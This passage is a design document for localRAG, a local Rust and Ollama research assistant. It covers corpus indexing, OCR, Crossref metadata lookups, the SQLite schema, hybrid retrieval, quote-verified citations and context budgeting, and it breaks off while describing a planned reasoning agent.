# localRAG: Architecture & Implementation Plan

*Last revised 2026-10-31. Your original notes are kept verbatim in Appendix A.*

## 1. Overview

localRAG is a local research assistant for a body of literature. You put the documents for a
research topic in a workspace folder. localRAG indexes them and serves a web UI on localhost.
There you can search the documents and ask questions that a local Ollama model answers **only
from the indexed literature, with citations**. When the literature doesn't support an answer,
it says so and suggests what material to add.

Guiding principles:
- **Grounded or silent.** Every claim is cited and checked against its source. Unsupported
  claims are flagged, never hidden. A 4–9B local model can't be made infallible, so the
  failure rate is **measured** with an eval set (§17).
- **Local.** Documents, indexes and models stay on the machine. The only network calls are
  rate-limited Crossref metadata lookups (§7).
- **Stateful.** Re-running only processes what changed.
- **Isolated.** Each workspace has its own index, history and brains.
- **Transparent.** Anything dropped from the model's context triggers a warning (§11).
- **Later:** a reasoning agent (§12) that questions the RAG and builds a reviewed, cited
  "second brain" for each reasoning model.

## 2. Decisions summary

| Area | Decision | § |
|------|----------|---|
| Language | Rust | 3 |
| Platform | Apple Silicon Macs only (`aarch64-apple-darwin`) | 3 |
| Distribution | `.dmg` with an ad-hoc-signed `.app`. No Apple Developer account, so no notarization; colleagues approve it manually on first launch | 19 |
| Inference | Ollama. The chat model is chosen per request from installed models | 10 |
| Embedding model | `qwen3-embedding:0.6b` (1024 dimensions) | 5 |
| Inputs | `.pdf`, `.md`, `.txt`. Scanned PDFs are OCR'd with Apple Vision | 5, 6 |
| Corpus | `<workspace>/corpus/`, tens to hundreds of documents | 4 |
| Storage | One SQLite file per workspace: tables + FTS5 + sqlite-vec | 8 |
| Document statuses | `pending`, `indexed`, `needs_ocr`, `failed`, `removed`. Removed documents can be *forgotten* | 5 |
| Citation metadata | Crossref only (no Zotero). Rate-limited for polite/public pools; email asked for on first load | 7 |
| Citations | `[Author Year, p. N]` with the exact quoted span highlighted in the source | 10 |
| Unverified quotes | Flagged as unverified, and the whole cited chunk is highlighted so you can judge the paraphrase. You can promote one to **Verified Paraphrase** | 10, 15 |
| Chat history | Kept per workspace | 8 |
| Context size | `num_ctx` chosen from RAM (16k on 16 GB), fixed per model, sent on every request | 11 |
| Over budget | Submit is blocked with "Over token count by X tokens". No live counter | 11 |
| Context overload | Always warn when anything is dropped from context | 11 |
| Reasoning agent | Tools `read_brain`, `ask_corpus`, `propose_fact`, `organize_brain` | 12 |
| Brains | One Markdown file per reasoning model. `[FACT]` lines are immutable to the model; headings and `[THOUGHT]` lines are visible to it only in `organize_brain` | 12 |
| Fact review | Proposed facts wait in a queue for your approval. Rejected or deleted facts are never proposed again | 12 |
| Reference integrity | Every fact ID and chunk reference is resolved and checked; unresolvable ones are excluded and reported | 13 |
| UI | Four tabs (Search, Ask, Documents, Second Brain), a workspace menu named after the open workspace, and Settings. The app is called **localRAG** | 15 |
| One instance | Only one copy of localrag runs at a time, with one workspace active. A second `serve` opens the running one; CLI commands that write refuse while it runs | 4 |
| Workspace picker | On first load the UI lists known workspaces to choose from. With none known, it asks where to create one; the location can only be picked with the macOS folder chooser, never typed. The workspace menu has New / Open / Recent | 4, 15 |
| Adding documents | Documents → **Add documents…** uploads into `corpus/` and triggers indexing. Only `.pdf`/`.md`/`.txt`; each file is parsed first and refused with a specific reason if it fails | 15 |
| Git safety | `.localrag/` and `corpus/` each ignore themselves in git; secrets are never stored in a workspace (§14) | 4, 14 |
| PDF parsing | PDFium runs only in a separate helper process (`localrag-pdf`), sandboxed with no network and no file writes. A crash or hang fails that one file | 14 |
| Renaming documents | Documents → **Rename** changes the file name only (the extension is fixed), with no reindex. References to the name are updated: document path, chat-history citations, eval set | 15 |

## 3. Platform & tech stack

**Rust, Apple Silicon only.** Why Rust over C++ with Bazel:
- Every piece has a mature crate: server, SQLite + vectors, PDF, Vision bindings, tokenizers,
  chunking, file walking.
- Cargo handles dependencies. With Bazel you'd write BUILD files for third-party C/C++
  libraries like PDFium.
- Tauri 2 produces the `.app` and `.dmg`.
- Application code that parses untrusted PDFs is memory-safe.

C++'s main advantage, calling inference libraries in-process, doesn't apply because Ollama
runs inference over HTTP.

| Concern | Choice |
|---------|--------|
| CLI | `clap` |
| Server | `tokio` + `axum` (SSE for streaming) |
| Ollama | `reqwest` + `serde_json`: `/api/chat`, `/api/embed`, `/api/tags`, `/api/show`, `/api/pull` |
| Storage | `rusqlite` with bundled SQLite (FTS5) + `sqlite-vec`, statically linked |
| PDF | `pdfium-render` + prebuilt PDFium shipped in the app: text, per-character boxes, page labels, page rendering |
| OCR | Apple Vision via `objc2-vision` |
| Markdown | `pulldown-cmark` |
| Chunking | `text-splitter` |
| Token counting | `tokenizers` (Hugging Face) |
| Hashing | `sha2` |
| Files | `ignore` (gitignore-style rules) |
| Config | `toml` + `serde` |
| Logging / errors | `tracing`, `anyhow` / `thiserror` |
| Frontend | Static HTML/JS/CSS embedded with `rust-embed`; vendored `marked`, `DOMPurify`, PDF.js. No build step, works offline |
| Desktop shell | Tauri 2: a native window around the same UI and an in-process server |

**Licenses (binaries will be redistributed):** PDFium (BSD/Apache), PDF.js (Apache-2.0),
sqlite-vec (MIT/Apache) and Tauri (MIT/Apache) are fine. Avoid MuPDF (AGPL).

## 4. Workspace & on-disk layout

A workspace is a folder with `.localrag/` and `corpus/`.
- **CLI:** walks up from the CWD to find `.localrag/`, like git. `localrag init` creates
  `.localrag/` and `corpus/`.
- **App:** one workspace is active at a time, chosen in the UI (below).

**One instance, one active workspace**
- **The lock:** `localrag serve` holds an exclusive `flock` on
  `~/.config/localrag/instance.lock`. The OS releases it when the process exits, even after a
  crash.
- **A second copy:** a second `localrag serve` reads `instance.json` (mode 0600; it holds the
  launch URL), opens the running app in the browser, and exits.
- **CLI commands that write** (`index`, `ask`, `forget`, `eval`) take the same lock, so they
  refuse while the app runs. Read-only ones (`status`, `search`, `check`, `doctor`) don't need it.
- **Starting:** plain `serve` starts with no workspace and the UI opens on the picker;
  `serve -C <dir>` opens that workspace directly.
- **Switching** replaces the active workspace for every route; it doesn't start a sync
  (indexing is manual, §15). A sync still running for the previous workspace finishes, and
  its result is discarded.
- **Known workspaces:** `~/.config/localrag/workspaces.json` (0600) stores only paths, names
  and last-opened times. Workspaces whose folder has disappeared are shown as unavailable.

```
my-research-topic/                ← workspace root
├── corpus/                       ← everything to index: .pdf, .md, .txt (subfolders OK)
├── brain/                        ← one brain file per reasoning model (§12)
│   └── deepseek-r1_8b.md
├── .localragignore               ← optional, gitignore syntax, relative to corpus/
└── .localrag/
    ├── config.toml               ← embed model, chunking, default chat model, num_ctx per model, OCR mode
    ├── index.db                  ← documents, chunks, FTS5, vectors, chat history, brain registry, fact queue
    ├── ocr/<sha256>.json         ← cached OCR results (§6)
    ├── brain-history/<model>/    ← previous brain versions, for undo (§12)
    ├── eval.jsonl                ← optional gold questions (§17)
    └── logs/
```

- **Only `corpus/` is indexed.** `brain/` sits outside it so a brain can never be cited as a
  source.
- **`.localrag/.gitignore` and `corpus/.gitignore`** each contain `*`. They're written on
  `init` and on every open if missing; an existing one is left alone, so you can delete or edit
  it to version your documents. Git therefore ignores both folders in any repository,
  including one created after the workspace.
- **Global config** `~/.config/localrag/config.toml` holds machine-wide settings: Ollama host,
  default models, and `crossref_email`. Workspace config overrides the defaults. The global
  cache `~/.cache/localrag/crossref/` holds metadata responses.
- **Isolation:** index, embeddings, OCR cache, chat history, brains and the fact queue are
  per workspace. Deleting `.localrag/` resets everything except the brain files and corpus.
- **Ignored in `corpus/`:** hidden files, unsupported extensions, files over a size cap, and
  `.localragignore` patterns.

## 5. Ingestion & incremental indexing

```
scan corpus/ → diff against DB → parse → (OCR) → chunk → embed → write    (one transaction per file)
```

**Change detection**, per file:
1. `(size, mtime_ns)` unchanged → skip, without reading the file.
2. Otherwise compute the SHA-256. If it's unchanged (the file was touched or copied), update
   the mtime and skip.
3. Hash changed → reparse, rechunk, replace the chunks, re-embed. Chunks whose `text_sha`
   already has a vector reuse it, so small edits don't re-embed a whole book.
4. Gone from disk → status `removed`.
5. A new file whose hash matches a `removed` document is a rename or return. It is restored
   with its new path, with no reparse, OCR or embedding.

**Statuses**

| Status | Meaning | Searchable |
|--------|---------|------------|
| `pending` | Queued or in progress | No |
| `indexed` | Parsed, chunked, embedded | Yes |
| `needs_ocr` | Some pages have no text layer. Text pages are indexed; scanned pages wait for OCR | Partly |
| `failed` | Parse error recorded; retried only when the file changes | No |
| `removed` | File gone from `corpus/`. Record, chunks and vectors are kept but excluded from search | No |

**Removed vs. forgotten**
- **Removed** documents keep their chunks, so citations in past answers and brain facts still
  resolve (§13), and a returning file is restored instantly.
- **Forget** (Documents tab, or `localrag forget <doc>`) permanently deletes the record, chunks,
  vectors and OCR cache, after confirmation. Bulk version: "Forget all removed".
  - Chat history keeps a citation snapshot, so old answers stay readable, showing the source
    as *forgotten*.
  - Brain facts that cite the document become *broken* (§13).
- Forget is offered only for removed documents. A file still in `corpus/` would just be
  re-indexed; to drop it, move it out or add it to `.localragignore`.

**Index-wide invalidation.** `meta` records `embed_model`, `embed_dim`, `chunker_version` and
parser versions. A new embedding model re-embeds everything. A new chunker rechunks
everything, reusing cached OCR. Changing the chat model never reindexes.

**Crash safety & startup.** Each file commits in its own transaction; an interrupted run
resumes from `pending` files. `localrag serve` syncs first (target: under a second for a few
hundred unchanged files). Large first indexes and OCR run in the background with progress,
and search works over whatever is already indexed.

**Parsing** produces `Block { text, pdf_page, page_label, section_path, char_range, ocr }`:
- **PDF:** PDFium text per page, plus per-character boxes for highlighting.
- **Page numbers:** `pdf_page` (the page index) is used for opening and highlighting.
  `page_label` (the printed page number) is used in citations. The label comes from the PDF's
  page labels, else from Crossref's `page` range (an article starting at p. 345 → offset 344),
  else `pdf_page` is used.
- **Markdown:** heading hierarchy; YAML front matter for title, author, year and `doi`.
  Citations use the section, e.g. `[Notes 2026, §Methods]`.
- **Text:** paragraphs; citations use line ranges.

**Chunking.** Structure-aware: headings, then paragraphs, packed to about 500 tokens with
about 15% overlap, and never split mid-sentence. Chunks keep their document, order, page
range, section and character offsets, so neighbors can be fetched and quotes mapped back to
character boxes.

**Embedding.** Batched `/api/embed` calls with `qwen3-embedding:0.6b`. Documents are embedded
as-is. Queries use Qwen3-Embedding's instruction format (`Instruct: <task>\nQuery: <q>`);
confirm the exact template in Phase 0.

## 6. OCR

1. **Detect** per page: almost no extractable text (under about 25 non-space characters) on
   a page that is mostly image → scanned. The document becomes `needs_ocr`, and its text pages
   are indexed immediately.
2. **Engine:** Apple Vision (`VNRecognizeTextRequest`, accurate mode). It's built into macOS,
   runs on the Neural Engine, needs nothing bundled, and returns lines with boxes and
   confidence. No other engine is needed.
3. **Process:** PDFium renders the page at about 300 DPI → Vision → lines mapped back to PDF
   coordinates → the same `Block` structure, flagged `ocr`.
4. **Cache:** `.localrag/ocr/<sha256>.json`, including the engine version. Corpus files are
   never modified. Only a change to the file's content triggers OCR again.
5. **When:** `ocr = "ask" | "auto" | "off"`, default `ask`.
   - With `ask`, the Documents tab shows **Run OCR**, since a 300-page book takes minutes.
   - Jobs run in the background with progress and cancel.
6. **Downstream:** citations get an *OCR* badge, quote matching is fuzzy, and highlighting
   works from Vision's boxes.
7. **Later:** a vision-capable Ollama model (`qwen3.5` reports `vision`) for low-confidence
   pages with math, tables or handwriting.

## 7. Citation metadata (Crossref)

There is no Zotero integration: it would need a separate app running and configured.
Metadata comes from Crossref's REST API (`api.crossref.org`), which needs no key.

**Lookup order**
1. **DOI found** (PDF metadata, first pages, or Markdown `doi:`) → `GET /works/{doi}`, a
   *single record* request.
2. **No DOI** → `GET /works?query.bibliographic=<title + first author>&rows=5`, a *list*
   request. Candidates are scored on title similarity, author and year.
   - A high-confidence match is accepted.
   - Otherwise it's shown in the Documents tab as a *proposed* match to confirm or reject.
3. **No match or offline** → PDF metadata → first-page heuristics → manual edit.

- **Precedence:** manual > Crossref DOI > confirmed Crossref query > PDF metadata >
  heuristics. `metadata_source` is shown in the Documents tab.
- **What's used:** authors, `issued` year, title, container, `page`, DOI (stored as CSL-JSON).
  It drives citation labels, the page-label offset and bibliography export.
- **What is sent:** only the DOI or the extracted title/author, plus the email if set.

**Rate limits** (Crossref's published limits):

| Pool | Single DOI record | List of records |
|------|-------------------|-----------------|
| Polite (`mailto` set) | 10 req/s, 3 concurrent | 3 req/s, 3 concurrent |
| Public (no email) | 5 req/s, 1 concurrent | 1 req/s, 1 concurrent |

- **One client per process,** shared by all workspaces and jobs, so the limits hold
  machine-wide.
- **Two limiters,** one per request type. Each is a token bucket (rate) plus a semaphore
  (concurrency), sized for the active pool.
- **Polite pool:** with an email set, every request carries `mailto=<email>` and the
  `User-Agent` `localrag/<version> (mailto:<email>)`. Without one, the public limits apply.
- **Adapt downward:** stricter `X-Rate-Limit-Limit` / `X-Rate-Limit-Interval` headers override
  the table.
- **Backoff:** on `429` or `5xx`, honor `Retry-After`, otherwise use exponential backoff with
  jitter, then retry on a later sync. Lookups run in a background queue and never block
  indexing; citation labels update when they finish.
- **Cache:** every response is cached in `~/.cache/localrag/crossref/` (machine-wide, shared
  by all workspaces). Each entry holds the request (`GET /works?query.bibliographic=…&rows=3`,
  parameters sorted, email left out), `fetched_at`, and the response (`null` for a 404).
  - **Before any request** the cache is checked. An entry younger than
    `cache_refresh_interval_days` (global config, default **14**, 0 = always ask; Settings and
    `localrag config set cache_refresh_interval_days N`) is used as is. An older one means
    Crossref is asked again and the entry replaced.
  - **Identical requests in flight** wait for the first one, then read what it cached, so
    concurrent lookups of the same DOI reach Crossref once.
  - **Crossref down or failing:** an expired entry is used rather than nothing.
  - **Refresh metadata** bypasses the cache for that document.
  - Entries from the older cache format (bare response, no timestamp) still count, dated by
    file mtime, and are rewritten in the new format on first use.

**Email**
- **First load:** a dialog explains the polite pool and asks for an email, with **Skip (use
  public pool)**. After a skip it doesn't ask again; Settings shows a note instead.
- **Settings:** view, change or clear the email, with format validation. Also available as
  `localrag config set crossref_email …`.
- Stored in the global config and sent only to Crossref.

### 7.1 Bibliographies and references

Each document's bibliography is split from its body when it's indexed (`bibliography.rs`).
The body is chunked and embedded as usual. The bibliography text isn't part of the body's
chunks, so reference entries never show up in search or answers. Its entries go to
`doc_references`. Each one is embedded separately for suggestions (see *Reference chunks*).

**Detection**
- **Start:** a heading (References, Bibliography, Literature cited, Works cited, …, with an
  optional `#` or section number) in the last 65% of the document. The first such heading
  followed by an entry-like line wins, else the last one.
- **End:** the next table, figure, appendix, supplementary-material, disclaimer or
  publisher's-note heading, or a Markdown heading; otherwise the end of the document.
- **Entries:** numbered lists (`1.`, `[1]`) are split on consecutive numbers, tolerating one
  missing number. Unnumbered lists are split where a line starts like an author
  (`Surname, I.` / `Surname I`). Page furniture (`Downloaded from …`, `[CrossRef]`,
  `[PubMed]`) is removed.
- Removing the region keeps page text intact, so character offsets, page labels and
  highlights still line up. Bumping `CHUNKER_VERSION` (now 2) re-chunks every document when
  the rules change; unchanged chunks reuse their embeddings.

**Enrichment** (after document metadata, same client and limits)
1. **DOI in the entry** → `GET /works/{doi}`.
2. **Otherwise** → `query.bibliographic=<entry text>&rows=3`. A candidate is accepted at score
   ≥ 0.8: 0.75 × the share of its title words found in the entry, + 0.15 for a matching year,
   + 0.1 for a matching first-author surname.
3. **Otherwise** → a **stub**: guessed title (the segment after the authors) and year from the
   entry text, marked *citation only*.

**Abstracts.** The full record of every matched reference is kept, including its abstract
when the publisher deposited one with Crossref (JATS markup turned into plain text). Titles
lose their markup too (`<scp>DNA</scp>` → `DNA`). References matched before abstracts were
kept are re-read once (`references::DETAILS_VERSION`), usually from the cache.

**Reference chunks.** Each looked-up reference is embedded as one chunk of its own: title,
authors, year and venue, then the abstract (for a stub, the citation string). The chunks live
in `reference_vec`, apart from `chunks_vec`. So they're never search results or answer
sources, only candidates for suggestions.
- A chunk is re-embedded only when its text changes (enrichment, a re-parsed bibliography).
- The same work cited by several documents is embedded once.
- Deleting a reference deletes its vector (trigger).
- Changing the embedding model drops them all; they're re-embedded with the new one.

**Linking to the corpus** (after every sync and enrichment): a reference is *in corpus* when
its DOI matches a document's, or its title matches with similarity ≥ 0.85 and the same year,
or a corpus title of 4+ words appears word for word in the entry text.

**Documents tab**
- **References:** the entry count ("N/A" when no bibliography was found), with "(N here)"
  when some are in the corpus. Hovering shows the list: label, title, *in corpus* or
  *citation only*.
- **Cited-By:** Crossref's `is-referenced-by-count` ("N/A" without a Crossref record).
- Status, Chunks, Pages, References and Cited-By sort on click (again to reverse); N/A
  always sorts last.

**Suggesting additions.** When an answer is "I don't know" (or has gaps), the question is
embedded and compared with the reference chunks of works *not* in the corpus.
- Those at cosine similarity ≥ 0.35 are deduplicated across documents and ranked.
- Up to 15 go to the model as `R1`…`Rn`, closest first. Each comes with an abstract excerpt
  (400 characters) and how many corpus documents cite it.
- If no reference is embedded yet, they're ranked by words shared with title and venue.
The model answers with a JSON schema (`{references: [{id, reason}], topics: [...]}`).
- Only ids from that list are kept (at most 3, no duplicates), and the shown reference is
  taken from the database, never from the model's text. So a suggested work always exists in
  some corpus document's bibliography.
- Free-text topics are still allowed and are labelled as unverified.
- The answer shows each pick's abstract, collapsed.
- With no candidates, or if the JSON doesn't parse, it falls back to the earlier bullet
  suggestions.

## 8. Storage schema (sketch)

```sql
PRAGMA foreign_keys = ON;   -- off by default in SQLite; set on every connection

CREATE TABLE meta (key TEXT PRIMARY KEY, value TEXT);   -- schema_version, embed_model, embed_dim, chunker_version

-- Corpus ----------------------------------------------------------------------------------
CREATE TABLE documents (
  id INTEGER PRIMARY KEY,
  path TEXT UNIQUE NOT NULL,              -- relative to corpus/
  size INTEGER, mtime_ns INTEGER, sha256 TEXT,
  status TEXT NOT NULL,                   -- pending|indexed|needs_ocr|failed|removed
  error TEXT, indexed_at TEXT, removed_at TEXT,
  csl_json TEXT, doi TEXT,
  metadata_source TEXT,                   -- manual|crossref_doi|crossref_query|pdf|heuristic
  metadata_status TEXT,                   -- pending|matched|proposed|unmatched
  cite_label TEXT, page_label_offset INTEGER
);
CREATE INDEX documents_sha ON documents(sha256);

CREATE TABLE chunks (
  id INTEGER PRIMARY KEY,
  doc_id INTEGER NOT NULL REFERENCES documents(id) ON DELETE CASCADE,
  ord INTEGER, text TEXT, text_sha TEXT,
  pdf_page_start INTEGER, pdf_page_end INTEGER, page_label_start TEXT, page_label_end TEXT,
  section TEXT, char_start INTEGER, char_end INTEGER, n_tokens INTEGER, ocr INTEGER
);
CREATE INDEX chunks_text_sha ON chunks(text_sha);

-- v5: bibliography entries (documents also gains reference_count, NULL = no bibliography,
-- and cited_by)
CREATE TABLE doc_references (
  id INTEGER PRIMARY KEY,
  doc_id INTEGER NOT NULL REFERENCES documents(id) ON DELETE CASCADE,
  ord INTEGER, number INTEGER, raw TEXT, doi TEXT, year INTEGER,
  status TEXT DEFAULT 'pending',          -- pending|matched|stub
  csl_json TEXT, title TEXT, cited_by INTEGER,
  in_corpus_doc_id INTEGER, checked_at TEXT,
  abstract TEXT, details_version INTEGER,  -- v6
  embed_text_sha TEXT                     -- v6: the reference chunk last embedded
);
CREATE VIRTUAL TABLE reference_vec USING vec0(embedding float[1024]);  -- v6, rowid = doc_references.id

CREATE VIRTUAL TABLE chunks_fts USING fts5(text, section, content='chunks', content_rowid='id');
CREATE VIRTUAL TABLE chunks_vec USING vec0(embedding float[1024]);    -- rowid = chunks.id

CREATE TRIGGER chunks_ai AFTER INSERT ON chunks BEGIN
  INSERT INTO chunks_fts(rowid, text, section) VALUES (new.id, new.text, new.section);
END;
CREATE TRIGGER chunks_ad AFTER DELETE ON chunks BEGIN
  INSERT INTO chunks_fts(chunks_fts, rowid, text, section) VALUES ('delete', old.id, old.text, old.section);
  DELETE FROM chunks_vec WHERE rowid = old.id;
END;

-- Chat history ----------------------------------------------------------------------------
CREATE TABLE sessions (id INTEGER PRIMARY KEY, title TEXT, model TEXT, created_at TEXT);
CREATE TABLE messages (
  id INTEGER PRIMARY KEY,
  session_id INTEGER NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
  role TEXT, content TEXT,
  citations_json TEXT,     -- snapshot: label, page, quote, status (verified|unverified|verified_paraphrase), doc sha256, chunk text_sha
  warnings_json TEXT,      -- context-overload warnings (§11)
  supported INTEGER, model TEXT, created_at TEXT
);

-- Brains (§12, §13), schema v7 -------------------------------------------------------------
CREATE TABLE brain_facts (                -- registry: the source of truth for fact IDs
  model TEXT, fact_id TEXT,               -- e.g. 'deepseek-r1:8b', 'F-0012'
  line TEXT,                              -- the registered [FACT] line, for Restore
  line_sha TEXT,                          -- hash of that line
  claim TEXT,
  status TEXT,                            -- active|stale|broken|deleted
  added_at TEXT, run_id INTEGER, reason TEXT,
  PRIMARY KEY (model, fact_id)
);
CREATE TABLE fact_citations (
  model TEXT, fact_id TEXT, ord INTEGER,
  label TEXT, doc_sha256 TEXT, chunk_text_sha TEXT, quote TEXT,
  resolution TEXT,                        -- resolved|relocated|source_removed|broken
  resolved_chunk_id INTEGER, checked_at TEXT,
  PRIMARY KEY (model, fact_id, ord)
);
CREATE TABLE fact_links (model TEXT, a TEXT, b TEXT, kind TEXT);          -- kind: conflicts
CREATE TABLE fact_queue (
  id INTEGER PRIMARY KEY, model TEXT,
  kind TEXT,                              -- new|merge
  target_fact_id TEXT,                    -- for merge
  claim TEXT, citations_json TEXT, reason TEXT,
  question TEXT,                          -- the sub-question it came from (closed-book probe)
  related_json TEXT,                      -- near-duplicate / conflicting active facts
  status TEXT,                            -- pending|approved|rejected|merged
  run_id INTEGER, created_at TEXT, decided_at TEXT
);
CREATE TABLE rejected_facts (             -- never propose these again
  id INTEGER PRIMARY KEY, model TEXT, claim TEXT, citations_json TEXT,
  origin TEXT,                            -- queue_reject|deleted
  at TEXT
);
CREATE TABLE brain_embeddings (id INTEGER PRIMARY KEY, model TEXT, kind TEXT, ref TEXT, text_sha TEXT);  -- kind: fact|rejected
CREATE VIRTUAL TABLE brain_vec USING vec0(embedding float[1024]);   -- rowid = brain_embeddings.id
CREATE TABLE agent_runs (id INTEGER PRIMARY KEY, model TEXT, question TEXT, status TEXT, result_json TEXT, error TEXT, created_at TEXT, finished_at TEXT);
```

**Why the triggers.** `ON DELETE CASCADE` only works between regular tables. FTS5 and
sqlite-vec tables are *virtual tables* run by extension modules, and they can't take part.
Without the triggers, deleting a document would remove its chunks but leave orphans in the
keyword and vector indexes. Those orphans would keep matching searches and point at chunks
that no longer exist. The triggers also fire for cascaded deletes.

Vectors are inserted in code. Search joins on `documents.status = 'indexed'` to skip
non-indexed documents. At roughly 5k–30k chunks, over-fetching and filtering is cheap.

## 9. Retrieval

1. **Standalone query (follow-ups):** the chat model rewrites "what about its limitations?"
   into a self-contained query.
2. **Hybrid search:** top ~30 from BM25 (FTS5) plus top ~30 from vector kNN, merged with
   Reciprocal Rank Fusion. BM25 catches names, acronyms and exact terms; vectors catch
   paraphrase.
3. **Diversify:** cap chunks per document.
4. **Expand:** attach neighboring chunks (`ord ± 1`) to the top hits.
5. **Fill** the context budget (§11), usually 6–10 chunks.
6. **Rerank (later),** only if the eval shows a gain.

The **Search** tab exposes steps 2–3 directly, with no LLM involved.

## 10. Answers & grounding

**Model selection.** The dropdown lists `/api/tags` filtered to models whose `/api/show`
capabilities include `completion`, which hides embedding-only models. Temperature is
0.1–0.3. For thinking models, `think` is passed, and the reasoning is shown in a collapsible
block and excluded from validation.

**Citations: `[Author Year, p. N]` with highlighted quotes**
- **Prompt labels:** sources are labeled `[S1]…[Sn]` in the prompt, and the model cites
  `[S3 "short verbatim quote"]`. Short IDs are easy for a small model to get right and easy to
  validate.
- **Display:** the renderer shows `[Smith 2021, p. 12]` (`pp. 12–13`; `2021a/b` for
  collisions; the filename if there's no metadata).
- **Quote verification:** whitespace, hyphenation and ligatures are normalized, then the
  quote is located in the cited chunk (fuzzy matching for OCR text).
  - Found → it becomes the highlighted span.
  - Not found → the citation is flagged. A quote missing from its source is a strong sign of
    hallucination, and checking for it is deterministic and nearly free.
- **Citation statuses:**

  | Status | Meaning | What the UI highlights |
  |--------|---------|------------------------|
  | **Verified** | The quote was found in the cited chunk | Just the quoted span |
  | **Unverified** | No quote, or the quote isn't in the chunk (usually a paraphrase) | The **entire cited chunk**, so you can compare the claim with the original text |
  | **Verified Paraphrase** | An unverified citation you reviewed and accepted | The entire chunk, marked as a reviewed paraphrase |

  - **Promoting:** any unverified citation in the Ask tab can be promoted to Verified
    Paraphrase, and demoted again. The choice is stored on that message in chat history,
    with a timestamp.
  - **"Supported":** an answer counts as supported once it has at least one verified or
    verified-paraphrase citation.
  - The CLI still prints the closest sentence for unverified citations, because it can't
    show a highlighted chunk.
- **Highlighting:** span offsets → PDFium character boxes (Vision boxes for OCR pages) →
  rectangles in a vendored PDF.js viewer, opened at the page.

**Grounding layers, cheapest first**
1. **Retrieval gate:** if no chunk clears a calibrated relevance threshold, the model is
   skipped and the "not found" response is returned.
2. **Prompt contract:** use only the given sources; cite every factual sentence; if
   unsupported, begin with `INSUFFICIENT:` and say what's missing.
3. **Validation:** citation IDs must exist, quotes must verify, and uncited sentences are
   flagged. Zero valid citations means the answer is unsupported. Flagged sentences are
   styled visibly.
4. **Strict mode (optional):** a second pass asks of each cited sentence "does this span
   support the claim?" It is always on for brain admissions (§12).

**"I don't know" response**
- A plain statement that the corpus doesn't support an answer.
- The closest material found, and why it falls short.
- Suggestions for material to add (topics, keywords, kinds of sources). Titles from the
  model's memory are labeled *unverified*.
- Later: suggestions mined from the reference lists of indexed papers.

**Return type**, shared by the UI, CLI and agent:

```rust
pub struct Answer {
    pub text: String,                     // markdown with [S#] markers
    pub supported: bool,                  // false → "I don't know" path
    pub citations: Vec<Citation>,         // chunk, doc, page label, span, quote_verified
    pub sources: Vec<RetrievedChunk>,
    pub unsupported_sentences: Vec<String>,
    pub suggestions: Vec<String>,
    pub warnings: Vec<ContextWarning>,    // §11
    pub model: String,
    pub thinking: Option<String>,
}
```

Internally, citations are stable references (document hash + chunk text hash + span);
`[S#]` and author-year are display only. This lets the agent and the brain combine citations
from many answers.

## 11. Context management

**Context size (`num_ctx`)**
- The limit is the configured `num_ctx`, never the model's advertised maximum. `qwen3.5:4b`
  advertises 262,144 tokens, which is far beyond what fits in memory.
- `num_ctx` is sent on every request, because Ollama otherwise truncates silently.
- It's fixed per model in config, because Ollama reloads the model whenever `num_ctx` changes.
- **Defaults**, chosen at first run from RAM and capped at the model's maximum:

  | Unified memory | Default `num_ctx` |
  |----------------|-------------------|
  | 8 GB | 8,192 |
  | 16 GB | 16,384 |
  | 24 GB and up | 32,768 (raise manually if wanted) |

  - **Why 16k on 16 GB:** a typical turn needs 6k–10k tokens. That breaks down as system
    prompt ~0.6k, sources 3k–5k, history ~2k, question ~0.2k, plus the answer. This leaves
    room for a 9B model's KV cache beside the embedding model.
  - **The 32k ceiling:** small models degrade with very long contexts, so more isn't
    automatically better. The eval can justify raising it.
  - **Editable per model in Settings.** If Ollama can't load a model at the chosen size, the
    next size down is used, with a notice.

**Budget**
- **Fixed costs:** system prompt + output reserve (~1k plain, ~4k for thinking models,
  because reasoning tokens count against `num_ctx`) + a minimum grounding reserve (~3
  chunks, ~1.5k) + the question. Brain facts are included for agent runs (§12).
- **History** fills what's left, newest first. Older turns drop out of the context but stay
  in the history (with a warning).
- **Sources** then fill the remaining space.

**Submit blocking**
- On Submit, the server computes the fixed costs. If they exceed `num_ctx`, nothing reaches
  the model. The text stays in the box with the error **"Over token count by X tokens"**,
  plus the cause (e.g. "the question is 2,310 tokens; the limit for questions with this model
  is 1,900").
- There's no live counter. `POST /api/ask` enforces the same check, so the CLI and agent get
  the same error.

**Token counting**
- Ollama has no tokenize endpoint, so counts come from bundled `tokenizers` files for known
  families (Qwen, Llama, DeepSeek), which are exact.
- Other models use a character estimate, calibrated per model from Ollama's reported
  `prompt_eval_count`, plus a 10% margin.

**Context-overload warnings: always on, no setting to disable**

| Dropped | Example |
|---------|---------|
| Older chat turns | "Context full: 3 earliest turns of this chat (2,140 tokens) were left out." |
| Relevant sources | "4 of 11 relevant passages didn't fit; the answer used the top 7." |
| Neighbor expansion | "Surrounding context for 3 passages was left out." |
| Brain facts (§12) | "Brain: 38 of 120 facts included." |
| Unresolvable facts (§13) | "2 brain facts were left out: their sources no longer resolve." |
| Agent step results (§12) | "Step 2's answer was shortened to fit." |
| **Ollama truncated anyway** | "The model received less than was sent; the answer may be missing information." |

- **Detecting truncation:** Ollama's truncation is caught when its `prompt_eval_count` falls
  well below localrag's count, or when the prompt filled `num_ctx`. The answer is then marked
  possibly incomplete.
- **Where warnings appear:** as a `context_warning` SSE event with a banner on the answer (a
  breakdown on click), on stderr in the CLI, and stored in `messages.warnings_json`.
- **A warning is not a block.** A block means the question can't run; a warning means it
  ran with less context than wanted.

## 12. Reasoning agent & second brain (Phase 7)

**Tools** (via Ollama tool calling)

| Tool | Purpose | What the model sees |
|------|---------|---------------------|
| `read_brain(query)` | Recall approved knowledge; the first stop on a cold start | Compact `[FACT]` lines only |
| `ask_corpus(question) -> Answer` | A grounded RAG answer (§10) | Answer text + citations |
| `propose_fact(claim, citations, reason)` | Send a candidate to the Fact queue | Accepted / dropped (and why) |
| `organize_brain()` | Restructure its own brain | Full layout: headings, `[THOUGHT]` lines, facts by ID |

```
question
  → read_brain → relevant approved facts
  → plan sub-questions the brain doesn't cover
  → loop (max N steps):
        ask_corpus(sub_q) → Answer
        → propose_fact → admission checks → Fact queue → (you approve) → brain file
  → final answer citing ORIGINAL sources (via brain facts or ask_corpus)
  → validation: every citation and fact ID resolves (§13)
```

On 16 GB, the reasoning model also answers `ask_corpus` by default, to avoid Ollama swapping
models at every step. Reasoning models are installed models with the `thinking` and `tools`
capabilities.

**Reports** (the **Report** tab; `localrag agent --report`). The same agent, with a
